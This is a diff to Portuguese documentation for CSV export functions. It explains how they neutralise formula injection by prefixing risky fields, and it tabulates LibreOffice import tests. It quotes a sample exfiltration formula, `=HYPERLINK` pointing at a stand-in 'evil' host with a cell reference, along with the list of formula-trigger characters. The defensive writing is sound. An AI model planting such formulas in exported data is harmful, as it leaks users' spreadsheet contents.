@@ -458,9 +458,24 @@ await downloadCsv(usuarios, COLUNAS, "usuarios.csv"); // entrega ao usuário
     Campo com o delimitador, com aspas ou com quebra de linha vira campo citado, e cada aspas interna é duplicada. O arquivo termina as linhas com `\r\n`. O BOM vem por padrão porque sem ele o Excel em pt-BR lê UTF-8 como Latin-1 e todo acento vira mojibake.
 
 !!! check "Fórmula vira texto por padrão (CSV injection)"
-    Campo de texto que começa com `=`, `+`, `-`, `@`, TAB ou CR é **fórmula** pra Excel, LibreOffice e Google Sheets — e abrir o arquivo a avalia. Um nome de usuário `=HYPERLINK("https://evil/?d="&A1,"ver")` vira um link que vaza as outras células. Por isso `toCsv` e `downloadCsv` prefixam `'` nesses campos, como recomenda a OWASP: o LibreOffice 26.2 importou `=1+2` como a fórmula `of:=1+2` (valor `3`) antes, e como o texto `'=1+2` depois.
+    Campo de texto que começa com `=`, `+`, `-`, `@`, TAB ou CR é tratado como início de **fórmula** pela lista da OWASP — Excel e Google Sheets leem assim; o LibreOffice 26.2 avaliou só o `=` (tabela abaixo). Abrir o arquivo avalia a fórmula. Um nome de usuário `=HYPERLINK("https://evil/?d="&A1,"ver")` vira um link que vaza as outras células. Por isso `toCsv` e `downloadCsv` prefixam `'` nesses campos, como recomenda a OWASP: o LibreOffice 26.2 importou `=1+2` como a fórmula `of:=1+2` (valor `3`) antes, e como o texto `'=1+2` depois.
 
-    Número não é tocado: célula `number`, ou texto que é só número (`"-5"`, `"-1.234,56"`, `"+42"`), não pode ser fórmula — e prefixar transformaria todo valor negativo do relatório em texto. O custo é o `'` visível no texto neutralizado. Se o arquivo vai pro importador de outro sistema, e não pra planilha de uma pessoa, desligue com `{ neutralizeFormulas: false }` e os bytes saem como vieram.
+    Número não é tocado: célula `number`, ou texto que é só número (`"-5"`, `"-1.234,56"`, `"+42"`), não pode ser fórmula — e prefixar transformaria todo valor negativo do relatório em texto. O `"-"` sozinho também fica como está: é o placeholder de "sem valor" e não tem operando para virar fórmula. O custo é o `'` visível no texto neutralizado. Se o arquivo vai pro importador de outro sistema, e não pra planilha de uma pessoa, desligue com `{ neutralizeFormulas: false }` e os bytes saem como vieram.
+
+Como cada entrada é lida, medido convertendo o CSV com o LibreOffice 26.2 headless (`soffice --headless --infilter="CSV:59,34,76,1" --convert-to fods`) e lendo o `table:formula` de cada célula:
+
+| Entrada | Sem prefixo (`neutralizeFormulas: false`) | Com prefixo (padrão) |
+| --- | --- | --- |
+| `=1+2` | fórmula, valor `3` | texto `'=1+2` |
+| `=HYPERLINK("http://…/?d="&A1,"x")` | fórmula | texto |
+| `+55 (11) 99999-9999` | texto | texto `'+55 (11) 99999-9999` |
+| `@maria` | texto | texto `'@maria` |
+| `-` | texto | texto `-` (isento) |
+| TAB + `=1+1` | texto | texto `'` + TAB + `=1+1` |
+| espaço + `=1+1` | texto | texto (não é gatilho) |
+| `\n=1+1` (campo entre aspas) | texto | texto (não é gatilho) |
+
+O LibreOffice só avaliou o `=`. `+`, `@` e TAB seguem no gatilho porque Excel e Google Sheets os leem como início de fórmula — essa é a lista da OWASP, e ela não foi medida aqui no Excel.
 
 !!! tip "Delimitador `;` é o certo em locale pt-BR"
     Onde o separador decimal é a vírgula, o Excel abre um CSV separado por vírgula **em uma coluna só**. `{ delimiter: ";" }` resolve — e o escaping acompanha, citando o campo que contém `;` em vez do que contém `,`.
